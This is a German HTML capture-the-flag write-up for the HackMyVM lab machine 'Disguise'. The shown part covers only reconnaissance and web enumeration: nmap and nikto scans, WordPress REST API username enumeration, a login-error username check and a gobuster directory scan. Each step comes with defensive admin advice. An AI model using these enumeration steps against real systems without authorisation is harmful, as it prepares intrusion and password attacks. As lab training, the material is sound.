<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Disguise - HackMyVM - Hard - Bericht</title>
    <link rel="stylesheet" href="style.css">
	<link rel="stylesheet" href="../../horizontale-navbar.css">
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
</head>
 <body>

    <div class="header-bg">
        <h1>Disguise - HackMyVM - Hard - Bericht</h1>
        <div class="level-container level-hard">
            <h2 class="level-hard">Hard</h2>
            <div class="circle">
                <div class="segment segment-1"></div>
                <div class="segment segment-2"></div>
                <div class="segment segment-3"></div>
                <div class="inner"></div>
            </div>
        </div>
    </div>

    <div class="container">
        <section class="tools-used">
            <h2>Verwendete Tools</h2>
            <div class="tools-grid">
                <div class="tool-item">arp-scan</div>
                <div class="tool-item">nmap</div>
                <div class="tool-item">nikto</div>
                <div class="tool-item">curl</div>
                <div class="tool-item">jq</div>
                <div class="tool-item">gobuster</div>
                <div class="tool-item">wfuzz</div>
                <div class="tool-item">vi</div>
                <div class="tool-item">wpscan</div>
                <div class="tool-item">hydra</div>
                <div class="tool-item">nano</div>
                <div class="tool-item">mysql</div>
                <div class="tool-item">php</div>
                <div class="tool-item">sqlmap</div>
                <div class="tool-item">nc (netcat)</div>
                <div class="tool-item">python3</div>
                <div class="tool-item">wget</div>
                <div class="tool-item">chmod</div>
                <div class="tool-item">find</div>
                <div class="tool-item">stty</div>
                <div class="tool-item">ls</div>
                <div class="tool-item">cat</div>
                <div class="tool-item">sudo</div>
                <div class="tool-item">systemctl</div>
                <div class="tool-item">ps</div>
                <div class="tool-item">pspy64</div>
                <div class="tool-item">gcc</div>
                <div class="tool-item">docker</div>
                <div class="tool-item">podman</div>
                <div class="tool-item">make</div>
                <div class="tool-item">cp</div>
                <div class="tool-item">rm</div>
                <div class="tool-item">mkdir</div>
                <div class="tool-item">touch</div>
                <div class="tool-item">echo</div>
                <div class="tool-item">export</div>
                <div class="tool-item">env</div>
                <div class="tool-item">dmesg</div>
                <div class="tool-item">getcap</div>
                <div class="tool-item">uname</div>
                <div class="tool-item">crunch</div>
                <div class="tool-item">suForce</div>
            </div>
        </section>

        <section class="toc">
            <h2>Inhaltsverzeichnis</h2>
            <ul>
                <li><a href="#reconnaissance">Reconnaissance</a></li>
                <li><a href="#web-enumeration">Web Enumeration</a></li>
                <li><a href="#initial-access">Initial Access</a></li>
                <li><a href="#proof-of-concept">Proof of Concept</a></li>
                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
                <li><a href="#flags">Flags</a></li>
            </ul>
        </section>

        <section id="reconnaissance">
            <h2>Reconnaissance</h2>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
                    <pre>
192.168.2.189
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` sendet ARP-Requests (Address Resolution Protocol) an alle Geräte im lokalen Netzwerk, um deren IP- und MAC-Adressen zu ermitteln. Die Option `-l` steht für `--localnet` und bewirkt, dass die Adressen aus der Konfiguration der Netzwerkschnittstellen ermittelt werden. Die Ausgabe wird dann durch `grep "PCS"` gefiltert, um Zeilen zu finden, die "PCS" enthalten (typischerweise Teil des Herstellernamens "PCS Systemtechnik GmbH", oft mit VirtualBox assoziiert). Schließlich extrahiert `awk '{print $1}'` die erste Spalte dieser gefilterten Zeilen, welche die IP-Adresse ist. In diesem Fall wurde die IP-Adresse 192.168.2.189 identifiziert.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt ist ein grundlegender Teil der Reconnaissance-Phase in einem lokalen Netzwerk. Er ist effektiv, um schnell aktive Hosts zu identifizieren, insbesondere wenn ICMP-Pings (Ping-Scans) möglicherweise blockiert sind. Die Kombination mit `grep` und `awk` ist eine gängige Methode, um die Ausgabe auf die gewünschten Informationen zu reduzieren.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `arp-scan` ist ein exzellentes Tool für die anfängliche Host-Discovery im LAN. Für eine umfassendere Sichtweise könnten zusätzlich Tools wie `netdiscover` oder Nmap's Ping-Scan (`nmap -sn`) verwendet werden, falls ARP-Scans nicht die gewünschten Ergebnisse liefern oder um Ergebnisse zu verifizieren.<br><strong>Empfehlung (Admin):</strong> Aus administrativer Sicht ist es wichtig, eine aktuelle Inventarliste aller Geräte im Netzwerk zu führen. Überwachungstools, die ungewöhnliche ARP-Aktivitäten (z.B. ARP-Spoofing) erkennen, können die Netzwerksicherheit erhöhen.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nmap -sC -sS -sV -T5 -A 192.168.2.189 -p- | grep open</span></div>
                    <pre>
<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)</span>
<span class="command">80/tcp open  http    Apache httpd 2.4.59 ((Debian))</span>
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Dieser Nmap-Befehl führt einen umfassenden Scan auf der zuvor identifizierten IP-Adresse 192.168.2.189 durch.
                <ul>
                    <li><code>-sC</code>: Führt Standard-Nmap-Skripte aus (Script-Scan).</li>
                    <li><code>-sS</code>: Führt einen TCP SYN-Scan (Stealth-Scan) durch, der oft weniger auffällig ist als ein voller TCP-Connect-Scan.</li>
                    <li><code>-sV</code>: Versucht, die Versionen der laufenden Dienste zu ermitteln (Versionserkennung).</li>
                    <li><code>-T5</code>: Setzt das Timing-Template auf "insane" für einen schnelleren Scan (kann auf instabilen Netzwerken oder bei Intrusion Detection Systems problematisch sein).</li>
                    <li><code>-A</code>: Aktiviert OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute. Dies ist eine aggressive Option, die viele Informationen sammelt.</li>
                    <li><code>-p-</code>: Scannt alle 65535 TCP-Ports.</li>
                    <li><code>| grep open</code>: Filtert die Ausgabe, um nur Zeilen anzuzeigen, die "open" enthalten, also offene Ports.</li>
                </ul>
                Die Ausgabe zeigt, dass Port 22 (SSH) mit OpenSSH 7.9p1 und Port 80 (HTTP) mit Apache httpd 2.4.59 offen sind.
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Nmap-Scan hat erfolgreich die offenen Ports und die darauf laufenden Dienste inklusive ihrer Versionen identifiziert. Dies sind die primären Angriffsvektoren für die weitere Untersuchung. Die Verwendung von `-T5` und `-A` beschleunigt den Prozess, kann aber auch dazu führen, dass der Scan von Sicherheitssystemen eher erkannt wird. Das Filtern mit `grep open` ist nützlich für eine schnelle Übersicht.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die identifizierten Dienste (SSH und HTTP) sind die nächsten logischen Ziele für die Enumeration. Für HTTP sollte eine Web-Enumeration (Verzeichnisse, Dateien, Technologien) folgen. Für SSH könnten Benutzername-Enumeration und Passwort-Angriffe in Betracht gezogen werden, falls schwache Anmeldeinformationen vermutet werden.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle laufenden Dienste auf dem neuesten Stand sind und keine bekannten Schwachstellen aufweisen. Beschränken Sie den Zugriff auf Dienste nur auf notwendige Quellen. Für SSH sollten starke Passwörter oder besser Key-basierte Authentifizierung verwendet werden. Webserver sollten gehärtet und regelmäßig auf Schwachstellen überprüft werden.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nmap -sC -sS -sV -T5 -A 192.168.2.189 -p-</span></div>
                    <pre>
Starting Nmap 7.94SVN ( [Link: https://nmap.org | Ziel: https://nmap.org] ) at 2025-05-02 17:07 CEST
Nmap scan report for disguise (192.168.2.189)
Host is up (0.00011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)</span>
| ssh-hostkey: 
|   <span class="command">2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)</span>
|   <span class="command">256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)</span>
|_  <span class="command">256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)</span>
<span class="command">80/tcp open  http    Apache httpd 2.4.59 ((Debian))</span>
|_http-generator: <span class="command">WordPress 6.7.2</span>
|_http-title: <span class="command">Just a simple wordpress site</span>
|_http-server-header: <span class="command">Apache/2.4.59 (Debian)</span>
MAC Address: <span class="command">08:00:27:4A:C4:30 (Oracle VirtualBox virtual NIC)</span>
Device type: <span class="command">general purpose</span>
Running: <span class="command">Linux 4.X|5.X</span>
OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
OS details: <span class="command">Linux 4.15 - 5.8</span>
Network Distance: 1 hop
Service Info: OS: <span class="command">Linux</span>; CPE: <span class="command">cpe:/o:linux:linux_kernel</span>

TRACEROUTE
HOP RTT     ADDRESS
1   0.11 ms disguise (192.168.2.189)

OS and Service detection performed. Please report any incorrect results at [Link: https://nmap.org/submit/ | Ziel: https://nmap.org/submit/] .
Nmap done: 1 IP address (1 host up) scanned in 11.08 seconds
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Dies ist die vollständige Ausgabe des vorherigen Nmap-Befehls (ohne `| grep open`). Sie liefert detailliertere Informationen:
                <ul>
                    <li><strong>SSH (Port 22):</strong> OpenSSH 7.9p1 Debian 10+deb10u4. Die Host-Schlüssel (RSA, ECDSA, ED25519) werden ebenfalls angezeigt. Diese Version von OpenSSH ist zwar nicht die allerneueste, aber ohne bekannte kritische, aus der Ferne ausnutzbare Schwachstellen für diese spezifische Debian-Version auf den ersten Blick.</li>
                    <li><strong>HTTP (Port 80):</strong> Apache httpd 2.4.59 unter Debian. Das Skript `http-generator` hat erkannt, dass die Website mit **WordPress 6.7.2** betrieben wird. Der Titel der Seite ist "Just a simple wordpress site".</li>
                    <li><strong>MAC-Adresse:** 08:00:27:4A:C4:30, was auf eine Oracle VirtualBox virtuelle NIC hinweist. Dies bestätigt, dass es sich wahrscheinlich um eine virtuelle Maschine handelt.</li>
                    <li><strong>Betriebssystem:** Nmap schätzt das Betriebssystem als Linux Kernel 4.x oder 5.x (spezifischer Linux 4.15 - 5.8).</li>
                    <li><strong>Traceroute:** Zeigt nur einen Hop, was typisch für ein Ziel im selben lokalen Netzwerk ist.</li>
                </ul>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Die vollständige Nmap-Ausgabe ist extrem wertvoll. Die Entdeckung von WordPress 6.7.2 ist ein wichtiger Anhaltspunkt, da WordPress-Installationen, Themes und Plugins häufig Schwachstellen aufweisen. Die genauen Versionen von OpenSSH und Apache sind nützlich für die Schwachstellenrecherche. Die OS-Informationen sind hilfreich, um später potenzielle Kernel-Exploits oder systemspezifische Angriffe zu berücksichtigen. Die Information, dass es sich um eine VirtualBox VM handelt, ist für den Kontext des Pentests (z.B. HackMyVM) relevant.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Fokus sollte nun stark auf die WordPress-Instanz gelegt werden. Tools wie `wpscan` sind unerlässlich, um Themes, Plugins, Benutzer und bekannte Schwachstellen zu enumerieren. Für Apache könnten spezifische Konfigurationsfehler oder Modulschwachstellen gesucht werden (z.B. mit Nikto). Für SSH bleibt die Möglichkeit von Brute-Force-Angriffen, falls Benutzernamen bekannt werden.<br><strong>Empfehlung (Admin):</strong> WordPress und alle zugehörigen Themes/Plugins müssen dringend auf dem neuesten Stand gehalten werden. Nicht benötigte Themes/Plugins sollten deinstalliert werden. Starke, einzigartige Passwörter für alle WordPress-Benutzer sind ein Muss, ebenso wie für den SSH-Zugang. Regelmäßige Sicherheitsaudits der Webanwendung und des Servers sind empfohlen.</p>
        </section>

        <section id="web-enumeration">
            <h2>Web Enumeration</h2>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nikto -h http://disgus.hmv</span></div>
                    <pre>
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          <span class="command">192.168.2.189</span>
+ Target Hostname:    <span class="command">disgus.hmv</span>
+ Target Port:        <span class="command">80</span>
+ Start Time:         2025-05-02 17:19:30 (GMT2)
---------------------------------------------------------------------------
+ Server: <span class="command">Apache/2.4.59 (Debian)</span>
+ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]
+ /: Drupal Link header found with value: &lt;http://disguise.hmv/wp-json/&gt;; rel="https://api.w.org/". See: [Link: https://www.drupal.org/ | Ziel: https://www.drupal.org/]
+ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]
+ /cRCVIosa.: <span class="command">Uncommon header 'x-redirect-by' found, with contents: WordPress.</span>
+ <span class="password">No CGI Directories found</span> (use '-C all' to force check all possible dirs)
+ /robots.txt: <span class="command">contains 2 entries which should be manually viewed.</span> See: [Link: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt | Ziel: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt]
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Nikto ist ein Webserver-Scanner, der auf bekannte Schwachstellen, Fehlkonfigurationen und interessante Dateien/Verzeichnisse prüft. Der Befehl `nikto -h http://disgus.hmv` scannt die Webseite unter der angegebenen Hostnamen (setzt voraus, dass `disgus.hmv` in der `/etc/hosts`-Datei des Angreifers auf die IP 192.168.2.189 verweist).
                Wichtige Funde:
                <ul>
                    <li>Server-Version bestätigt: Apache/2.4.59 (Debian).</li>
                    <li>Fehlender `X-Frame-Options`-Header: Dies kann die Seite anfällig für Clickjacking-Angriffe machen.</li>
                    <li>Drupal Link Header: Interessanterweise wird ein Drupal-spezifischer Link-Header gefunden, obwohl Nmap WordPress identifiziert hat. Dies könnte auf eine Migration, gemischte Technologien oder eine Fehlkonfiguration hindeuten. Der Link zeigt auf `/wp-json/`, was wiederum auf WordPress hindeutet.</li>
                    <li>Fehlender `X-Content-Type-Options`-Header: Kann zu MIME-Sniffing-Angriffen führen, bei denen der Browser den Inhaltstyp falsch interpretiert.</li>
                    <li>Ungewöhnlicher Header `x-redirect-by: WordPress`: Ein Hinweis auf WordPress als zugrundeliegende Technologie.</li>
                    <li>`robots.txt` gefunden: Diese Datei enthält Anweisungen für Webcrawler und listet oft Verzeichnisse auf, die nicht indexiert werden sollen (z.B. Admin-Bereiche).</li>
                    <li>Antwort auf ungültige HTTP-Methoden: Könnte auf eine lockere Serverkonfiguration hindeuten.</li>
                </ul>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Nikto liefert wertvolle Hinweise auf Sicherheits-Header, die fehlen, und bestätigt die Präsenz von WordPress. Der "Drupal Link header" ist ein kleiner Ausreißer, der aber wahrscheinlich auf die WordPress REST API (`wp-json`) zurückzuführen ist. Die Funde bezüglich der fehlenden HTTP-Security-Header sind typische "Low Hanging Fruits", die die allgemeine Sicherheit der Webanwendung verbessern könnten. Die Existenz von `robots.txt` ist ein Standardfund und erfordert eine manuelle Überprüfung.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die `robots.txt` sollte als Nächstes manuell überprüft werden. Die WordPress REST API (`/wp-json/`) ist ein bekanntes Ziel für die Benutzer-Enumeration. Die gemeldeten fehlenden Security-Header sind zwar an sich keine direkten Einfallstore, sollten aber im Bericht erwähnt werden.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden HTTP-Security-Header: `X-Frame-Options: SAMEORIGIN` (oder `DENY`) und `X-Content-Type-Options: nosniff`. Überprüfen Sie die Notwendigkeit und Konfiguration des `x-redirect-by` Headers. Der Inhalt der `robots.txt` sollte darauf geprüft werden, ob er sensible Pfade preisgibt, die besser nicht öffentlich bekannt sein sollten.</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
http://disgus.hmv/robots.txt

User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Dies ist der Inhalt der Datei `robots.txt`, die von Nikto gefunden wurde.
                <ul>
                    <li>`User-agent: *`: Diese Regel gilt für alle Webcrawler.</li>
                    <li>`Disallow: /wp-admin/`: Weist Crawler an, das Verzeichnis `/wp-admin/` nicht zu indexieren. Dies ist der Standard-Adminbereich von WordPress.</li>
                    <li>`Allow: /wp-admin/admin-ajax.php`: Erlaubt explizit den Zugriff auf `admin-ajax.php` innerhalb von `/wp-admin/`. Diese Datei wird von WordPress für AJAX-Anfragen (asynchrone JavaScript- und XML-Anfragen) verwendet, oft auch von Plugins und Themes für Frontend-Funktionalitäten.</li>
                </ul>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Inhalt der `robots.txt` ist Standard für eine WordPress-Seite. Sie verbirgt den Admin-Bereich vor Suchmaschinen, was eine gute Praxis ist, aber keinen echten Schutz vor gezielten Angriffen darstellt, da der Pfad allgemein bekannt ist. Die explizite Erlaubnis für `admin-ajax.php` ist ebenfalls normal und notwendig für die Funktionalität vieler WordPress-Seiten.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Obwohl `/wp-admin/` bekannt ist, bestätigt dies den Pfad zum Login-Bereich. `admin-ajax.php` kann manchmal für die Enumeration von Plugin-Aktionen oder sogar für bestimmte Arten von Schwachstellen (z.B. unauthentifizierte AJAX-Aktionen) interessant sein, falls Plugins dies fehlerhaft implementieren.<br><strong>Empfehlung (Admin):</strong> Die `robots.txt` ist korrekt konfiguriert. Zusätzliche Sicherheitsmaßnahmen für den `/wp-admin/`-Bereich könnten IP-Whitelisting, Zwei-Faktor-Authentifizierung (2FA) oder ein zusätzlicher HTTP-Authentifizierungsschutz sein.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl -s http://disguise.hmv/wp-json/WP/V2/users/1 | jq</span></div>
                    <pre>
{
  <span class="command">"id": 1,</span>
  <span class="command">"name": "simpleAdmin",</span>
  "url": "http://disguise.hmv",
  "description": "",
  <span class="command">"link": "http://disguise.hmv/author/simpleadmin/",</span>
  <span class="command">"slug": "simpleadmin",</span>
  "avatar_urls": {
    "24": "https://secure.gravatar.com/avatar/d3a57b149cd6e0e91d594f2e5c5492135cbfa87a952c49406829077629a5ba54?s=24&amp;d=mm&amp;r=g",
    "48": "https://secure.gravatar.com/avatar/d3a57b149cd6e0e91d594f2e5c5492135cbfa87a952c49406829077629a5ba54?s=48&amp;d=mm&amp;r=g",
    "96": "https://secure.gravatar.com/avatar/d3a57b149cd6e0e91d594f2e5c5492135cbfa87a952c49406829077629a5ba54?s=96&amp;d=mm&amp;r=g"
  },
  "meta": [],
  "_links": {
    "self": [
      {
        "href": "http://disguise.hmv/wp-json/wp/v2/users/1",
        "targetHints": {
          "allow": [
            "GET"
          ]
        }
      }
    ],
    "collection": [
      {
        "href": "http://disguise.hmv/wp-json/wp/v2/users"
      }
    ]
  }
}
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl -s http://disguise.hmv/wp-json/WP/V2/users/2 | jq</span></div>
                    <pre>
{
  <span class="password">"code": "rest_user_invalid_id",</span>
  <span class="password">"message": "Invalid user ID.",</span>
  "data": {
    "status": 404
  }
}
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Diese beiden `curl`-Befehle versuchen, Benutzerinformationen über die WordPress REST API abzurufen. Die REST API ist standardmäßig unter `/wp-json/` erreichbar. Der Endpunkt `/wp/v2/users/&lt;ID&gt;` gibt Informationen zu einem Benutzer mit einer bestimmten ID zurück.
                <ul>
                    <li><code>-s</code>: Silent-Modus, unterdrückt Fortschrittsanzeigen.</li>
                    <li><code>| jq</code>: Leitet die JSON-Ausgabe an das Tool `jq` weiter, um sie formatiert und lesbar darzustellen.</li>
                </ul>
                Der erste Befehl fragt Benutzerdaten für ID `1` ab und ist erfolgreich. Er enthüllt den Benutzernamen (`name` und `slug`) als "**simpleAdmin**". Dies ist oft der Standard-Administratorbenutzer, der bei der WordPress-Installation erstellt wird.
                Der zweite Befehl fragt Benutzerdaten für ID `2` ab. Die API antwortet mit einem Fehler `rest_user_invalid_id`, was bedeutet, dass kein Benutzer mit der ID `2` existiert oder der Zugriff darauf nicht erlaubt ist (wahrscheinlicher ist, dass der Benutzer nicht existiert).
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Die Enumeration von Benutzernamen über die WordPress REST API ist eine bekannte und oft erfolgreiche Methode. In diesem Fall wurde der Benutzername "simpleAdmin" bestätigt. Dies ist ein kritischer Informationsgewinn, da Benutzernamen die Hälfte der Anmeldeinformationen darstellen und für Brute-Force- oder Passwort-Spraying-Angriffe benötigt werden. Die Tatsache, dass ID 1 existiert und ID 2 nicht, deutet darauf hin, dass es möglicherweise nur einen primären Benutzer gibt oder weitere Benutzer höhere IDs haben und nicht sequentiell erraten werden können.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der gefundene Benutzername "simpleAdmin" sollte für Passwortangriffe auf den WordPress-Login (`/wp-login.php`) und potenziell auch SSH verwendet werden, falls Benutzernamen systemweit wiederverwendet werden. Weitere Enumeration über die REST API (z.B. Auflisten aller Benutzer über `/wp-json/wp/v2/users`, falls erlaubt) oder andere Methoden (z.B. WPScan) sollte erfolgen.<br><strong>Empfehlung (Admin):</strong> Der Zugriff auf Benutzerinformationen über die REST API sollte eingeschränkt werden, wenn nicht unbedingt öffentlich benötigt. Plugins können hier helfen, die API-Endpunkte feingranular zu steuern oder ganz zu deaktivieren. Verwenden Sie keine leicht zu erratenden oder Standard-Benutzernamen wie "admin" oder Variationen davon. Für kritische Benutzerkonten sollte Zwei-Faktor-Authentifizierung (2FA) aktiviert werden.</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
http://disguise.hmv/wp-login.php

Error: The password you entered for the username 
       simpleadmin is incorrect. Lost your password?
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Diese Ausgabe stammt vermutlich von einem manuellen Login-Versuch auf der WordPress-Anmeldeseite (`http://disguise.hmv/wp-login.php`) mit dem zuvor enumerierten Benutzernamen "simpleAdmin" und einem geratenen oder falschen Passwort.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Die Fehlermeldung "The password you entered for the username simpleadmin is incorrect" bestätigt, dass der Benutzername "simpleadmin" auf dem System existiert. Dies ist eine weitere Verifizierung des Benutzernamens. WordPress gibt standardmäßig preis, ob der Benutzername oder das Passwort falsch ist, was Angreifern hilft, Benutzernamen zu validieren.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da der Benutzername bestätigt ist, können nun gezielte Brute-Force- oder Passwort-Spraying-Angriffe mit Passwortlisten gegen "simpleadmin" gestartet werden. Tools wie `wpscan` oder `hydra` sind hierfür geeignet.<br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie WordPress so, dass es generische Fehlermeldungen ausgibt (z.B. "Ungültige Anmeldeinformationen"), die nicht preisgeben, ob der Benutzername oder das Passwort falsch war. Implementieren Sie Mechanismen zur Begrenzung von Anmeldeversuchen (Login Lockout), um Brute-Force-Angriffe zu erschweren. Verwenden Sie starke, einzigartige Passwörter und aktivieren Sie 2FA.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">gobuster dir -u http://disgus.hmv -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map -b '503,404' -e --no-error -k</span></div>
                    <pre>
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     <span class="command">http://disgus.hmv</span>
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                <span class="command">/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
[+] Negative Status codes:   503,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              <span class="command">deb,bat,py,lib,dll,java,eps,kdbx,pem,zip,docx,raw,csh,diff,js.map,html,pdf,json,pl,jpg,icon,pub,accdb,exp,rpm,phtml,ELF,old,ps1,gz,bak,conf,c,desc,doc,sh,crt,config,asp,xml,cgi,csv,elf,rar,mdb,exe,rtf,xlsx,svg,tar,db,png,jpeg,mod,sql,aspx,ln,txt,php,xls</span>
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
<span class="command">http://disgus.hmv/index.php</span>            (Status: 301) [Size: 0] [--&gt; http://disgus.hmv/]
<span class="command">http://disgus.hmv/wp-content</span>           (Status: 301) [Size: 313] [--&gt; http://disgus.hmv/wp-content/]
http://disgus.hmv/.php                 (Status: 403) [Size: 275]
http://disgus.hmv/.html                (Status: 403) [Size: 275]
http://disgus.hmv/.phtml               (Status: 403) [Size: 275]
<span class="command">http://disgus.hmv/rss</span>                  (Status: 301) [Size: 0] [--&gt; http://disgus.hmv/feed/]
<span class="command">http://disgus.hmv/login</span>                (Status: 302) [Size: 0] [--&gt; http://disguise.hmv/wp-login.php]
<span class="command">http://disgus.hmv/login.php</span>            (Status: 302) [Size: 0] [--&gt; http://disguise.hmv/wp-login.php]
http://disgus.hmv/0                    (Status: 301) [Size: 0] [--&gt; http://disgus.hmv/0/]
<span class="command">http://disgus.hmv/feed</span>                 (Status: 301) [Size: 0] [--&gt; http://disgus.hmv/feed/]
<span class="command">http://disgus.hmv/atom</span>                 (Status: 301) [Size: 0] [--&gt; http://disgus.hmv/feed/atom/]
<span class="command">http://disgus.hmv/wp-content</span>           (Status: 301) [Size: 313] [--&gt; http://disgus.hmv/wp-content/]
<span class="command">http://disgus.hmv/admin</span>                (Status: 302) [Size: 0] [--&gt; http://disguise.hmv/wp-admin/]
Progress: 27619 / 13456722 (0.21%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 27619 / 13456722 (0.21%)
===============================================================
Finished
===============================================================
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Gobuster ist ein Werkzeug zur Brute-Force-Enumeration von Verzeichnissen und Dateien auf Webservern.
                <ul>
                    <li><code>dir</code>: Aktiviert den Verzeichnis/Datei-Brute-Force-Modus.</li>
                    <li><code>-u http://disgus.hmv</code>: Die Ziel-URL.</li>
                    <li><code>-w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"</code>: Gibt die Wortliste an, die für das Brute-Forcing verwendet wird. Die `directory-list-2.3-medium.txt` ist eine gängige, mittelgroße Liste.</li>
                    <li><code>-x ...</code>: Eine lange Liste von Dateierweiterungen, die Gobuster an jeden Eintrag in der Wortliste anhängen und testen soll.</li>
                    <li><code>-b '503,404'</code>: Gibt HTTP-Statuscodes an, die als "nicht gefunden" oder uninteressant betrachtet und daher ausgeblendet werden sollen.</li>
                    <li><code>-e</code>: Erweiterter Modus, gibt die vollständige URL für gefundene Verzeichnisse aus.</li>
                    <li><code>--no-error</code>: Unterdrückt Fehler beim DNS-Lookup oder bei der Verbindung.</li>
                    <li><code>-k</code>: Überspringt die SSL-Zertifikatsverifizierung (hier nicht relevant, da HTTP).</li>
                </ul>
                Der Scan wurde nach 0.21% manuell abgebrochen (`^C`). Die gefundenen Einträge sind meist Standard-WordPress-Pfade (`index.php`, `wp-content`, `rss`, `login`, `feed`, `admin`), die entweder zu anderen Orten weiterleiten (Status 301 oder 302) oder Zugriff verweigern (Status 403 für versteckte Dateien wie `.php`).
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Gobuster-Scan wurde zu früh abgebrochen, um wirklich umfassende Ergebnisse zu liefern. Die bisherigen Funde bestätigen jedoch die WordPress-Struktur. Die Verwendung einer sehr langen Liste von Erweiterungen (`-x`) in Kombination mit einer mittelgroßen Wortliste kann die Scandauer erheblich verlängern. Das Ausschließen gängiger Fehlercodes wie 404 ist sinnvoll.</p>
